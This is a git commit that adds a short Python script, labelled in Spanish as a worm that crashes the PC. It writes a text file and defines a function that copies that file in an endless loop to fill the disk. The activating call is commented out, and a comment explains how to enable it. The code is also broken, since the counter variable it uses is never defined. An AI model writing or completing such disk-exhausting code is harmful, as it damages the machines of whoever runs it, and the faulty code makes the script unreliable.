074bc8e64e9469b484b5c50915219aa753209354
Truth <138615922+Jorgeepython@users.noreply.github.com>
2024-02-01 14:05:56 +0100

    Add files via upload

---
+++ main.py
@@ -0,0 +1,29 @@
+# GUSANO EN PYTHON QUE COLAPSA EL PC:
+
+import os
+import shutil
+
+
+
+def cargar_archivo():
+    gusano = open("truth.txt" , "w") # Crea un archivo txt y lo llena con 50 lineas
+
+    for i in range(0, 50):
+        gusano.write(f"Gusanito: {i} \n")
+        
+    gusano.close()
+
+def worm():
+
+    while True:
+        shutil.copy2("truth.txt" , f"truth-gusano{contador}.py") 
+
+
+cargar_archivo()
+
+# Si cambias # por w en la siguiente linea, activas el gusano
+#orm()   
+
+
+
+    
